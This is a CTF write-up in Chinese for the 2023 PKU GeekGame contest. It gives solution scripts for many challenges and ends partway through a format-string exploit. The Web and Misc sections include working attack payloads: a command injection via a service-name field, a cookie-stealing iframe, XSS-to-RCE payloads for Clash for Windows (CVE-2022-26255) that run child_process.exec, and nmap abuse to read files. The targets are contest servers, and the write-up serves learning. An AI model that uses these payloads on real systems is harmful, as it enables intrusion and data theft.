---
title: "GeekGame 2023 题解"
date: 2023-10-21
lastmod: 2023-10-21
keywords: ["GeekGame"]
description: ""
tags: ["GeekGame", "CTF"]
categories: []
author: ""

comment: false
toc: true
autoCollapseToc: false
contentCopyright: false
reward: false
katex: false
---

第三届北京大学信息安全综合能力竞赛（GeekGame）题解

<!--more-->

> 题目及其余题解可以在 [PKU-GeekGame/geekgame-3rd](https://github.com/PKU-GeekGame/geekgame-3rd) 中查看

去年参加过 GeekGame，但后来摆烂了。今年得分 4218，总排名第 9

这次因为在 Pwn 上耗费了一些时间，有些 Misc 来不及做了。

最近事情有点多，所以题解写得比较随意……

## 环境

+ Debian Bookworm
+ Python 3.11
+ Ghidra（我的 IDA Free 坏掉了，不能反编译）

## Tutorial

### 1. 一眼盯帧

> 比赛前就看到题目名字是“一眼盯帧”，准备好了 Kdenlive，但还是没拿到第一。

先读出 GIF 文件中的字符串：`synt{unirnavprtrrxtnzr}`

这是凯撒密码，找一个[转换网站](http://moersima.00cha.net/kaisamima.asp)。当偏移量为 13 时，得到 ` flag{haveanicegeekgame}`

<br>

### 2. 小北问答

1. GPT 帮我找到了 [HPC 文档](https://hpc.pku.edu.cn/_book/guide/slurm/sbatch.html)，提交非交互式任务可以通过 `sbatch` 命令来完成。

2. [Xiaomi_Kernel_OpenSource](https://github.com/MiCode/Xiaomi_Kernel_OpenSource) 中提到，Redmi K60 Ultra 手机的内核的仓库位于 [corot-t-oss](https://github.com/MiCode/Xiaomi_Kernel_OpenSource/tree/corot-t-oss) 分支，其中的 `Makefile` 记录了版本为 `5.15.78`

3. GPT 找到了[Apple Watch Series 8（蜂窝网络、全球、41 毫米）规格](https://everymac.com/systems/apple/apple-watch/specs/apple-watch-series-8-gps-cellular-41mm-global-international-a2773.html)，版本号是 `Watch6,16`

4. 找到 [PKU-GeekGame/gs-backend](https://github.com/PKU-GeekGame/gs-backend)，其提交时间是 2023 年 10 月，其中的 `src/store/user_profile_store.py` 记录了计算方法，用以下代码在 `Python 3.8` 上运行可以得到禁止的字符数是 `4445`

   ```python
   from typing import TYPE_CHECKING, Optional, Set
   from unicategories import categories

   def unicode_chars(*cats: str) -> Set[str]:
       ret = set()
       for cat in cats:
           ret |= set(categories[cat].characters())
       return ret

   EMOJI_CHARS = ({chr(0x200d)}  # zwj
                  | {chr(0x200b)}  # zwsp, to break emoji componenets into independent chars
                  | {chr(0x20e3)}  # keycap
                  | {chr(c)
                     for c in range(0xfe00, 0xfe0f + 1)}  # variation selector
                  | {chr(c)
                     for c in range(0xe0020, 0xe007f + 1)}  # tag
                  | {chr(c)
                     for c in range(0x1f1e6, 0x1f1ff + 1)}  # regional indicator
                  )

   DISALLOWED_CHARS = (
       unicode_chars('Cc', 'Cf', 'Cs', 'Mc', 'Me', 'Mn', 'Zl', 'Zp')  # control and modifier chars
       | {chr(c)
          for c in range(0x12423, 0x12431 + 1)}  # too long
       | {chr(0x0d78)}  # too long
   ) - EMOJI_CHARS
   WHITESPACE_CHARS = unicode_chars('Zs') | EMOJI_CHARS

   print(len(DISALLOWED_CHARS))
   ```

5. [Wiki](https://zh.wikipedia.org/zh-hans/Bilibili) 上得到，2011 年 1 月，Bilibili 的域名是 `bilibili.us`。用 Web Archive 查到 [游戏区的页面](https://web.archive.org/web/20110122012044/http://bilibili.us/video/game.html)，子分区有 `游戏视频,游戏攻略·解说,Mugen,flash游戏`

6. 图中包含了 `sponsor 启迪控股 清华科技园 中关村 konza kacst` 等文字，用 Google 查到这是 [2023 年卢森堡 IASP 世界大会](http://www.iaspbo.com.cn/contents/2/533)，由 [地点 - IASP](https://www.iaspworldconference.com/conference/venue/)，举办地点是卢森堡欧洲会议中心 (ECCL) ，但 `eccl.lu` 不是答案，用 Google Map 发现它旁边有卢森堡音乐厅（Philharmonie Luxembourg），网址是 `philharmonie.lu`

<br>

## Misc

### 3. Z 公司的服务器

#### 服务器

直接打开网站链接发现不行，用 `nc prob05.geekgame.pku.edu.cn 10005` 后提示需要安装 `lrzsz`，`apt` 安装后即可接收文件

<br>

### 4. 猫咪状态监视器（第二阶段）

服务器运行的代码如下。只有 `STATUS` 可以输入一些内容

```python
while True:
    command = input("Command: ")
    if command == "LIST":
        cmd = "/usr/sbin/service --status-all"
        print(run(cmd))
    elif command == "STATUS":
        service_name = input("Service name: ")
        cmd = "/usr/sbin/service {} status".format(service_name)
        print(run(cmd))
    elif command == "EXIT":
        break
    else:
        print("Unknown command...")
```

按照提示查看 `/usr/sbin/service` 的代码，发现是直接用路径判断文件是否存在的

```bash
run_via_sysvinit() {
   # Otherwise, use the traditional sysvinit
   if [ -x "${SERVICEDIR}/${SERVICE}" ]; then
      exec env -i LANG="$LANG" LANGUAGE="$LANGUAGE" LC_CTYPE="$LC_CTYPE" LC_NUMERIC="$LC_NUMERIC" LC_TIME="$LC_TIME" LC_COLLATE="$LC_COLLATE" LC_MONETARY="$LC_MONETARY" LC_MESSAGES="$LC_MESSAGES" LC_PAPER="$LC_PAPER" LC_NAME="$LC_NAME" LC_ADDRESS="$LC_ADDRESS" LC_TELEPHONE="$LC_TELEPHONE" LC_MEASUREMENT="$LC_MEASUREMENT" LC_IDENTIFICATION="$LC_IDENTIFICATION" LC_ALL="$LC_ALL" PATH="$PATH" TERM="$TERM" "$SERVICEDIR/$SERVICE" ${ACTION} ${OPTIONS}
   else
      echo "${SERVICE}: unrecognized service" >&2
      exit 1
   fi
}
```

`SERVICEDIR` 是在 `/etc/init.d`。所以用以下 `name` 读取内容

```bash
../../bin/cat /flag.txt #
```

<br>

### 5. 基本功

#### 简单的 Flag

ZIP 压缩包里有 `chromedriver_linux64.zip`，用 `zipinfo` 得到文件大小为 5845152。找到版本为 `89.0.4389.23`，下载 [相应文件](https://chromedriver.storage.googleapis.com/index.html?path=89.0.4389.23/)

[ZIP 格式 - CTF Wiki](https://ctf-wiki.org/misc/archive/zip/) 上说使用 PKCrack 可以明文攻击

首先要建一个同样是 Store 压缩方式的压缩文件

```bash
zip -0 archive.zip chromedriver_linux64.zip
```

然后用 [pkcrack](https://github.com/keyunluo/pkcrack) 得到破解后的文件

```bash
./pkcrack -C challenge_1.zip -c chromedriver_linux64.zip -P archive.zip -p chromedriver_linux64.zip -d out -a
```

解压得到 `flag{Insecure Zip Crypto From Any Known File Content}`

#### 冷酷的 Flag

网上看到 [利用 bkcrack 对 zip 压缩包进行明文攻击 bilibili](https://www.bilibili.com/video/BV1iG411A7yJ/)

这题压缩包内是 [pcapng](https://pcapng.com/) 文件，其文件格式有一定规律。而只需要 12 字节就能使用 [bkcrack](https://github.com/kimci86/bkcrack)

看了一些 pcapng 文件，感觉第 8 个字节开始比较确定。用十六进制编辑器 Okteta 创建文件

```
4D 3C 2B 1A 01 00 00 00 FF FF FF FF FF FF FF FF
```

然后运行 bkcrack

```bash
./bkcrack -C challenge_2.zip -c flag2.pcapng -p 2.bin -o 8
```

得到密钥，然后重新创建压缩文件

```bash
./bkcrack -C challenge_2.zip -k 3158685f 64b8296b 052722e2 -U result.zip 123
```

解压，查看文件，得到 `flag{inSecUre-zIP-crYPtO-eveN-withOuT-KNOwN-fiLe-CoNtENT}`

<br>

### 6. Dark Room（第二阶段）

#### Flag 1

先玩一遍，要求 san 值在 117 以上就能拿到 flag1

查看 [游戏源码](https://github.com/tinichu316/Dark_Room)

找到两种钥匙、吃东西、找到及使用戒指都能增加 san 值。help 有 20% 的概率加 10 san 值，但更可能扣 10 san 值。

把所有的物品集齐到达终点前只有 91 的 san 值。

所以只能靠概率，连续三次 help 成功就可以达到目标

写了个交互脚本：

<details open>
<summary>代码</summary>



```python
from pwn import *
import re
from icecream import ic


def recvAndSendAfter(prompt, data):
    recv = sh.recvuntil(prompt).decode()
    print(recv)
    sh.sendline(data)
    return recv


for i in range(100):
    ic(i)
    sh = remote('prob16.geekgame.pku.edu.cn', 10016)

    sh.sendlineafter(
        'Please input your token: ', '419:MEUCIAJK6pgIYBAyoFwq0WANA1qSkViRLHOVsB2NajlbxhH9AiEAzmCTUCGKE9DnSt61ANO8cw2GpWE6Zj-1iFuTRm8E4Vg=')

    recvAndSendAfter("Type 'exit' to quit the application.", 'newgame')
    recvAndSendAfter('What\'s your name?', 'gwdx')
    recvAndSendAfter('Is gwdx what you want to be known as? ', 'y')
    recvAndSendAfter('[gwdx]:', 'n')
    recvAndSendAfter('[gwdx]:', 'n')
    recvAndSendAfter('[gwdx]:', 'e')
    recvAndSendAfter('[gwdx]:', 'pickup key')
    recvAndSendAfter('[gwdx]:', 'w')
    recvAndSendAfter('[gwdx]:', 's')
    recvAndSendAfter('[gwdx]:', 's')
    recvAndSendAfter('[gwdx]:', 'e')
    recvAndSendAfter('[gwdx]:', 'e')
    recvAndSendAfter('[gwdx]:', 'e')
    recvAndSendAfter('[gwdx]:', 'pickup trinket')
    recvAndSendAfter('[gwdx]:', 'w')
    recvAndSendAfter('[gwdx]:', 's')
    recvAndSendAfter('[gwdx]:', 'usewith key door')
    recvAndSendAfter('[gwdx]:', 's')
    recvAndSendAfter('[gwdx]:', 's')
    recvAndSendAfter('[gwdx]:', 'n')
    recvAndSendAfter('[gwdx]:', 'w')
    recvAndSendAfter('[gwdx]:', 'w')
    recvAndSendAfter('[gwdx]:', 'w')
    recvAndSendAfter('[gwdx]:', 'n')
    recvAndSendAfter('[gwdx]:', 'pickup key')
    recvAndSendAfter('[gwdx]:', 's')
    recvAndSendAfter('[gwdx]:', 'e')
    recvAndSendAfter('[gwdx]:', 'e')
    recvAndSendAfter('[gwdx]:', 'e')
    recvAndSendAfter('[gwdx]:', 'n')
    recvAndSendAfter('[gwdx]:', 'n')
    recvAndSendAfter('[gwdx]:', 'w')
    recvAndSendAfter('[gwdx]:', 'w')
    recvAndSendAfter('[gwdx]:', 'n')
    recvAndSendAfter('[gwdx]:', 'n')
    recvAndSendAfter('[gwdx]:', 'w')
    recvAndSendAfter('[gwdx]:', 'w')
    recvAndSendAfter('[gwdx]:', 'usewith key door')
    recvAndSendAfter('[gwdx]:', 'use trinket')
    while True:
        recv = recvAndSendAfter('[gwdx]:', 'h')
        sanity = re.search(r'\((.*)%\)', recv).group(1)
        sanityInt = int(sanity)
        ic(sanityInt)
        if sanityInt > 110:
            sh.interactive()
        if sanityInt < 50:
            sh.close()
            break
```

</details>

<br>

### 7. 麦恩·库拉夫特

#### 探索的时光

参考 [搭建教程](https://mivik.moe/ctf-minecraft/)，安装 Paper 服务端和 Minosoft 客户端。启动游戏，跟着火把走就能找到 flag

> Minosoft 的画质不如瑞典原神

<br>

## Web

### 8. Emoji Wordle

#### Level 1

> 题目中说 Level 1 的答案是固定的

用 Selenium 与网页交互。从推荐的答案中获取字符，一共有 128 种字符。

枚举每种字符，多跑几轮就能得到答案。

<details>
<summary>代码</summary>



```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from icecream import ic
import time

url = 'https://prob14.geekgame.pku.edu.cn/level1'

driver = webdriver.Chrome()
driver.get(url)


time.sleep(2)
answer = ' ' * 64


def read_or(filename, default):
    try:
        with open(filename, 'r') as f:
            return f.read()
    except:
        return default


emoji = read_or('emoji.txt', '')
allAnswer = read_or('answer.txt', ' ' * 64).splitlines()

emoji = set(emoji.strip())
print(emoji)

answer = allAnswer[-1]

for index in range(64):
    guessElement = driver.find_element(By.NAME, 'guess')
    guessExample = driver.find_element(By.NAME, 'guess').get_attribute('placeholder')
    emoji = emoji | set(guessExample)

    guess = ''
    for i in range(64):
        if answer[i] == ' ':
            if i < len(list(emoji)):
                guess += list(emoji)[64 + index]    # 需要更改
            else:
                guess += guessExample[i]
        else:
            guess += answer[i]

    ic(guess)

    driver.get(f'{url}?guess={guess}')
    time.sleep(.2)

    # find all li
    liElements = driver.find_elements(By.TAG_NAME, 'li')
    lastLi = liElements[-1]

    # 🟩 表示正确
    answer = ''
    correct = 0
    for i in range(64):
        if lastLi.text[i] == '🟩':
            answer += guess[i]
            correct += 1
        else:
            answer += ' '
    ic(answer)
    ic(index, correct)

with open('answer.txt', 'a') as f:
    f.write(f'{answer}\n')

emojiCount = len(emoji)
ic(emojiCount)

emoji = ''.join(emoji)
with open('emoji.txt', 'w') as f:
    f.write(f'{emoji}')
```

</details>


#### Level 2

> 题目中提示 Level 1 的答案是固定的；Level 2 和 3 的答案是随机生成并存储在会话中的。

发现用之前的 cookie 发送可以不消耗次数。所以可以先发送一次，然后再发送 128 次，枚举每个字符。

<details open>
<summary>代码</summary>



```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from icecream import ic
import time

url = 'https://prob14.geekgame.pku.edu.cn/level2'

driver = webdriver.Chrome()
driver.get(url)

cookie = driver.get_cookies()
ic(cookie)

time.sleep(2)
answer = ' ' * 64


def read_or(filename, default):
    try:
        with open(filename, 'r') as f:
            return f.read()
    except:
        return default


emoji = read_or('emoji.txt', '')
allAnswer = read_or('answer.txt', ' ' * 64).splitlines()

emoji = set(emoji.strip())
print(emoji)

answer = allAnswer[-1]

for index in range(129):
    guessElement = driver.find_element(By.NAME, 'guess')
    guessExample = driver.find_element(By.NAME, 'guess').get_attribute('placeholder')
    emoji = emoji | set(guessExample)

    guess = ''
    for i in range(64):
        if answer[i] == ' ':
            if i < len(emoji):
                guess += sorted(list(emoji))[index]
            else:
                guess += guessExample[i]
        else:
            guess += answer[i]

    ic(guess)

    driver.get(f'{url}?guess={guess}')
    time.sleep(.2)

    # set cookie
    # remove cookie and add cookie
    driver.delete_all_cookies()
    driver.add_cookie(cookie[0])

    # find all li
    liElements = driver.find_elements(By.TAG_NAME, 'li')
    lastLi = liElements[-1]

    # 🟩 表示正确
    answer = ''
    correct = 0
    for i in range(64):
        if lastLi.text[i] == '🟩':
            answer += guess[i]
            correct += 1
        else:
            answer += ' '
    ic(answer)
    ic(index, correct)

with open('answer.txt', 'a') as f:
    f.write(f'{answer}\n')

emojiCount = len(emoji)
ic(emojiCount)

emoji = ''.join(emoji)
with open('emoji.txt', 'w') as f:
    f.write(f'{emoji}')

input()
```

</details>

#### Level 3

比第二题难在了限制答题时间在 1 分钟内，所以只能猜 60 次左右。

从之前的多次提交中，可以发现不同 emoji 的出现次数有差异。可以统计每个 emoji 出现的次数，按照出现次数从大到小排序，然后按照顺序猜测。

<details open>
<summary>代码</summary>



```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from icecream import ic
import time

url = 'https://prob14.geekgame.pku.edu.cn/level3'

driver = webdriver.Chrome()
driver.get(url)

cookie = driver.get_cookies()
ic(cookie)

time.sleep(2)
answer = ' ' * 64


def read_or(filename, default):
    try:
        with open(filename, 'r') as f:
            return f.read()
    except:
        return default


emoji = read_or('emoji.txt', '')
allAnswer = read_or('answer.txt', ' ' * 64).splitlines()

emoji = set(emoji.strip())
print(emoji)

answer = ' ' * 64

emojiToCount = {}
for e in sorted(emoji, reverse=True):
    emojiToCount[e] = 0
for i in range(64):
    for line in allAnswer:
        if line[i] != ' ':
            emojiToCount[line[i]] += 1
# 从大到小排序
emojiList = sorted(emojiToCount.items(), key=lambda x: x[1], reverse=True)

ic(emojiList)

try:
    for index in range(129):
        guessElement = driver.find_element(By.NAME, 'guess')
        guessExample = driver.find_element(By.NAME, 'guess').get_attribute('placeholder')

        guess = ''
        for i in range(64):
            if answer[i] == ' ':
                if i < len(emoji):
                    guess += emojiList[index][0]
                else:
                    guess += guessExample[i]
            else:
                guess += answer[i]

        ic(guess)

        driver.get(f'{url}?guess={guess}')

        # set cookie
        # remove cookie and add cookie
        driver.delete_all_cookies()
        driver.add_cookie(cookie[0])

        # find all li
        liElements = driver.find_elements(By.TAG_NAME, 'li')
        lastLi = liElements[-1]

        # 🟩 表示正确
        answer = ''
        correct = 0
        for i in range(64):
            if lastLi.text[i] == '🟩':
                answer += guess[i]
                correct += 1
            else:
                answer += ' '
        ic(answer)

        emojiCount = len(emoji)
        ic(index, correct, emojiCount)

        if correct == 64:
            break

except Exception as e:
    ic(e)
    input()

with open('answer.txt', 'a') as f:
    f.write(f'{answer}\n')

ic(emojiCount)

emoji = ''.join(emoji)
with open('emoji.txt', 'w') as f:
    f.write(f'{emoji}')
```

</details>

<br>


### 9. 第三新XSS

#### 巡猎

目标是：`/admin` 下设置了 cookie，需要注册一个链接，去拿出 cookie

如果 `X-Frame-Options` 设置为 `SAMEORIGIN`，就能被同源的页面嵌入。本题中没有设置

所以使用 `iframe` 嵌入，就能获得 `/admin` 下的 cookie

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Parent Page</title>
    </head>
    <body>
        <iframe src="../admin" id="childFrame" width="600" height="400"> </iframe>
        <script>
            var iframeWin = document.getElementById('childFrame').contentWindow

            setTimeout(function () {
                cookie = iframeWin.document.cookie
                console.log(cookie)
                document.querySelector('title').innerHTML = cookie
            }, 1000)
        </script>
    </body>
</html>
```

> 注意提交时使用 http 的网址

得到 `flag{TotALlY-NO-sECuRItY-in-ThE-sAMe-OrIGiN}`

<br>

### 10. 简单的打字稿

#### Super Easy

源码要求输出的信息中不能直接包含 `flag`

查找资料，无法在运行时打印类型。GPT 帮我查到用类型模板有可能实现，并给出了移除第一个字符的模板

```typescript
type RemoveFirstChar<T extends string> =
  T extends `${infer FirstChar}${infer Rest}` ? Rest : never

type Result = RemoveFirstChar<flag1>
var t: Result = 'a'
```

#### Very Easy

使用 `infer` 获得 flag2 中的 `flag` 字符串。

只用 `RemoveFirstChar` 无法得到 flag，所以需要移除字符串中所有的 `flag` 字符串，无论大小写。

GPT4 搞出来这个代码：

```typescript
type ExtractF<T> = T extends {
  new (): {
    v: () => (
      a: (a: unknown, b: infer F & Record<string, string>) => never
    ) => unknown
  }
}
  ? F
  : never

type fString = keyof ExtractF<flag2>

type RemoveFlag<T extends string> =
  T extends `${infer Before}flag${infer After}` ? `${Before}f1${After}`
    : T extends `${infer Before}Flag${infer After}` ? `${Before}f2${After}`
    : T extends `${infer Before}fLag${infer After}` ? `${Before}f3${After}`
    : T extends `${infer Before}FLag${infer After}` ? `${Before}f4${After}`
    : T extends `${infer Before}flAg${infer After}` ? `${Before}f5${After}`
    : T extends `${infer Before}FlAg${infer After}` ? `${Before}f6${After}`
    : T extends `${infer Before}fLAg${infer After}` ? `${Before}f7${After}`
    : T extends `${infer Before}FLAg${infer After}` ? `${Before}f8${After}`
    : T extends `${infer Before}flaG${infer After}` ? `${Before}f9${After}`
    : T extends `${infer Before}FlaG${infer After}` ? `${Before}f10${After}`
    : T extends `${infer Before}fLaG${infer After}` ? `${Before}f11${After}`
    : T extends `${infer Before}FLaG${infer After}` ? `${Before}f12${After}`
    : T extends `${infer Before}flAG${infer After}` ? `${Before}f13${After}`
    : T extends `${infer Before}FlAG${infer After}` ? `${Before}f14${After}`
    : T extends `${infer Before}fLAG${infer After}` ? `${Before}f15${After}`
    : T extends `${infer Before}FLAG${infer After}` ? `${Before}f16${After}`
    : T

type Result2 = RemoveFlag<fString>
type Result3 = RemoveFlag<Result2>
var t: Result3 = 'a'
```

得到报错信息

```
error: TS2322 [ERROR]: Type '"a"' is not assignable to type '"f1{TS_f11_beTTER_tHAn_PyTH0N!}"'.
```

还原为 `flag{TS_fLaG_beTTER_tHAn_PyTH0N!}`

<br>

### 11. 逝界计划（第二阶段）

提示 nmap 集成有问题。安装此集成，有命令行参数可以填。

看了 `man`，选项 `-iL` 可以指定从文件中读取目标。

开启调试日志，在系统日志中可以查看报错信息，但无法得到正常运行时的信息。

> 题目中提到了读写文件

`nmap` 使用 `-oN` 可以将输出信息保存到文件中。

创建一个头像，在 docker 中确定其在文件系统中的位置，作为 `nmap` 的参数。`nmap` 集成的选项设置为

```bash
-iL /flag.txt -oN /config/image/2aa5e5182c1cd45619fbc1959d0132c6/512x512
```

下载文件得到

```
Failed to resolve "flag{soOoo-mAny-LOoPhOLEs-in-HomE-AsSisTAnt}".
```

<br>

### 12. 非法所得

#### Flag 1

Clash 的版本是 0.19.8，可以找到 [NVD - CVE-2022-26255](https://nvd.nist.gov/vuln/detail/CVE-2022-26255)，提供了 [payload](https://github.com/Fndroid/clash_for_windows_pkg/issues/2710)

```yaml
proxy-groups:
    - name: <img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
```

这个 CVE 是说：导入 yaml 文件时可以执行命令。我胡乱尝试了一下没有效果。

后来看了 Dockerfile，发现 Clash for windows 是跑在 Linux 上的。而题目中又提示可以阅读源码中的 `prepare_flag.mjs` 了解 Flag 的位置。

```javascript
import { chmodSync, readFileSync, writeFileSync } from 'node:fs'

function getFlag(path) {
    const content = readFileSync(path, 'utf8')
    writeFileSync(path, 'flag{no_flag_here}')
    return content
}

const flag0 = getFlag('/flag_0')
const flag1 = getFlag('/flag_1')
const flag2 = getFlag('/flag_2')

let profile = readFileSync('/app/profiles/flag.yml', 'utf8')
profile = profile.replace('flag{test}', flag0)
writeFileSync('/app/profiles/flag.yml', profile)

writeFileSync('/flag_easy', flag1)
chmodSync('/flag_easy', 0o666)

writeFileSync('/flag', flag2)
chmodSync('/flag', 0o400)
```

+ flag0 需要读取 `/app/profiles/flag.yml`
+ flag1 需要读取 `/flag_easy`
+ flag2 需要读取 `/flag`

发现可以用 `document.write` 输出内容（不过每次结束后都要重启环境）。

于是用 `fs` 读取并写在网页上。

> 需要用 VPS 搭建 Nginx，用于传输 yaml 文件

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
    - name: a
      type: socks5
      server: 127.0.0.1
      port: '17938'
      skip-cert-verify: true
    - name: abc
      type: socks5
      server: 127.0.0.1
      port: '8088'
      skip-cert-verify: true

proxy-groups:
    - name: <img/src="1"/onerror='const fs=require("fs"); fs.readFile("/app/profiles/flag.yml", "utf8", (err, data) => {document.write(data)});'>
      type: select
      proxies:
          - a
```

#### Flag 2

虽然这个 flag 在容器启动时被移除了

```javascript
const flag = readFileSync('/flag_easy', 'utf8')
writeFileSync('/flag_easy', 'flag{no_flag_here}')
```

但如果访问特定网站，它就能被写出来

```javascript
await page.goto(url.toString())
if (new URL(url).hostname === 'ys.pku.edu.cn') {
    await page.type('#primogem_code[type=password]', flag)
}
```

使用 hosts 字段指定域名解析结果为 VPS 的 ip 地址：

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
    - name: a
      type: socks5
      server: 127.0.0.1
      port: '17938'
      skip-cert-verify: true
    - name: abc
      type: socks5
      server: 127.0.0.1
      port: '8088'
      skip-cert-verify: true

proxy-groups:
    - name: b
      type: select
      proxies:
          - a

hosts:
  'ys.pku.edu.cn': <ip>
```

写一个 HTML，让客户端打印 `password` 中的内容

```html
<!DOCTYPE html>
<html lang="zh">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Primogem Code Page</title>
    </head>
    <body>
        <input id="primogem_code" type="password" placeholder="Enter your primogem code here" />
        <div id="password_display"></div>

        <script>
            const passwordInput = document.getElementById('primogem_code')
            const passwordDisplay = document.getElementById('password_display')

            setInterval(() => {
                passwordDisplay.textContent = passwordInput.value
            }, 1000)
        </script>
    </body>
</html>
```

#### Flag 3

找到文件 `readflag`，它能读取 `/flag`

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    setuid(0);
    FILE* fp = fopen("/flag", "r");
    char flag[64];
    fgets(flag, 64, fp);
    printf("%s", flag);
    return 0;
}
```

而 Dockerfile 中说有 sx 权限，意味着所有都能以 root 身份执行这个文件

```dockerfile
RUN cd /app && \
    gcc readflag.c -o readflag && \
    chown root:root readflag && \
    chmod +sx readflag && \
    chown -R node:node /home/node/.config
```

所以用 `node` 执行这个文件就行了

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
    - name: a
      type: socks5
      server: 127.0.0.1
      port: '17938'
      skip-cert-verify: true
    - name: abc
      type: socks5
      server: 127.0.0.1
      port: '8088'
      skip-cert-verify: true

proxy-groups:
    - name: <img/src="1"/onerror="const { exec } = require('child_process'); exec('/app/readflag', (error, stdout, stderr) => { if (error) document.write(error); else document.write('<code><pre>'+stdout+'</pre></code>')})">
      type: select
      proxies:
          - a
```

<br>

## Binary

### 13. 汉化绿色版免费下载

#### 普通下载

游戏内容是输入两遍密码，如果相同就成功。但成功后的 `flag1` 没有显示，可能是设置了颜色，找出以前用过的 [MisakaTranslator](https://github.com/hanmin0822/MisakaTranslator/) 来提取出现的文字内容。得到 `flag{did-you-unpack-the-xp3?}`

#### 高速下载（第二阶段）

第一题的 `flag` 提示使用 `xp3` 解包，用 xp3_upk 解包，得到代码文件。其中 `data/scenario/round1.ks` 记录了 hash 的计算过程：

<details>
<summary>计算过程</summary>



```
@eval exp="f.text = 'flag{'"
@eval exp="f.hash = 1337"

*round_1|输入第一遍

首先输入第一遍。[p]

*sel_loop|第一次输入

@jump storage="round2.ks" cond="f.text.charAt(f.text.length-1)=='}'"

当前文本：[emb exp="f.text"][r]

[link target=*sel_a clickse="SE_306"]> 输入 A[endlink][r]
[link target=*sel_e clickse="SE_306"]> 输入 E[endlink][r]
[link target=*sel_i clickse="SE_306"]> 输入 I[endlink][r]
[link target=*sel_o clickse="SE_306"]> 输入 O[endlink][r]
[link target=*sel_u clickse="SE_306"]> 输入 U[endlink][r]
[link target=*sel_fin clickse="SE_306"]> 输入 }[endlink][r]
[s]

*sel_a
@eval exp="f.text = f.text + 'A'"
@eval exp="f.hash = f.hash * 13337 + 11"
@jump target=*sel_end

*sel_e
@eval exp="f.text = f.text + 'E'"
@eval exp="f.hash = f.hash * 13337 + 22"
@jump target=*sel_end

*sel_i
@eval exp="f.text = f.text + 'I'"
@eval exp="f.hash = f.hash * 13337 + 33"
@jump target=*sel_end

*sel_o
@eval exp="f.text = f.text + 'O'"
@eval exp="f.hash = f.hash * 13337 + 44"
@jump target=*sel_end

*sel_u
@eval exp="f.text = f.text + 'U'"
@eval exp="f.hash = f.hash * 13337 + 55"
@jump target=*sel_end

*sel_fin
@eval exp="f.text = f.text + '}'"
@eval exp="f.hash = f.hash * 13337 + 66"
@jump target=*sel_end

*sel_end
@eval exp="f.hash = f.hash % 19260817"

输入完成！[p]
@jump target=*sel_loop
```

</details>

但是 hash 相同的字符串有很多，不能唯一确定答案。

第二阶段的提示是查看 `datasu.ksd`。找了 KirikiriDescrambler 解包，得到

```
%[
 "trail_round1_sel_i" => int 1,
 "autotrail_func_init" => int 1,
 "trail_func_init" => int 1,
 "autotrail_first_start" => int 1,
 "autotrail_round1_sel_i" => int 1,
 "trail_round1_round_1" => int 1,
 "trail_autolabel_autoLabelLabel" => int 18,
 "autotrail_round1_sel_end" => int 2,
 "trail_round1_sel_fin" => int 1,
 "autotrail_autolabel_autoLabelLabel" => int 2,
 "trail_round1_sel_a" => int 6,
 "autotrail_round1_sel_e" => int 1,
 "trail_first_start" => int 1,
 "trail_round1_sel_loop" => int 18,
 "autotrail_round1_sel_a" => int 1,
 "autotrail_round1_sel_o" => int 1,
 "trail_round1_sel_end" => int 17,
 "autotrail_round1_sel_loop" => int 1,
 "autotrail_round1_sel_fin" => int 1,
 "trail_round1_sel_e" => int 3,
 "autotrail_round2_round_2" => int 1,
 "trail_round1_sel_o" => int 6,
 "autotrail_round1_round_1" => int 2
]
```

这可能是说 `sel_a` `sel_e` `sel_i` `sel_o` 四个标签的跳转次数（相当于结果中各个字符出现次数）分别是 6 3 1 6。使用 DFS 计算出输入内容是 `flag{OOAAAAEAEIEAOOOO}`

```python
from icecream import ic


def update_hash(f_hash, char_value):
    f_hash = (f_hash * 13337 + char_value) % 19260817
    return f_hash


def hash(string):
    f_hash = 1337
    for char in string:
        if char == 'A':
            f_hash = update_hash(f_hash, 11)
        elif char == 'E':
            f_hash = update_hash(f_hash, 22)
        elif char == 'I':
            f_hash = update_hash(f_hash, 33)
        elif char == 'O':
            f_hash = update_hash(f_hash, 44)
        elif char == 'U':
            f_hash = update_hash(f_hash, 55)
        else:
            raise ValueError("无效字符")
    f_hash = update_hash(f_hash, 66)
    return f_hash


target_hash = 7748521

aTarget = 6
eTarget = 3
iTarget = 1
oTarget = 6

charToCount = {
    'A': 6,
    'E': 3,
    'I': 1,
    'O': 6,
}


def dfs(string, charToCount):
    if len(string) == 16:
        if hash(string) == target_hash:
            ic(string)
        return
    for char, count in charToCount.items():
        if count == 0:
            continue
        charToCount[char] -= 1
        dfs(string + char, charToCount)
        charToCount[char] += 1


dfs('', charToCount)
```

<br>

### 14. 初学 C 语言

#### Flag 1

代码是

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void test() {
    char buf[1024];
    char secrets[64] = "a_very_secret_string";
    int secreti1 = 114514;
    int secreti2 = 1919810;
    char publics[64] = "a_public_string";
    int publici = 0xdeadbeef;
    char flag1[64] = "a_flag";

    FILE* fp = fopen("flag_f503be2d", "r");
    fgets(flag1, 63, fp);
    fclose(fp);

    // get flag2 in another file
    while (1) {
        puts("Please input your instruction:\n");
        fgets(buf, 1023, stdin);
        if (memcmp(buf, "exit", 4) == 0)
            break;

        int t = printf(buf, publics, publici);
        if (t > 1024) {
            puts("Too long!\n");
            break;
        }
        putchar(10);
    }
}

int main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    test();
    return 0;
}
```

`flag1` 被读到了栈里面，只要在 `printf` 后输足够多的 `%lx` 就能泄露数据。

```python
from pwn import *
import binascii
from icecream import ic

sh = process('./pwn')

sh = remote('prob09.geekgame.pku.edu.cn', 10009)
sh.sendlineafter(
    'Please input your token: ',
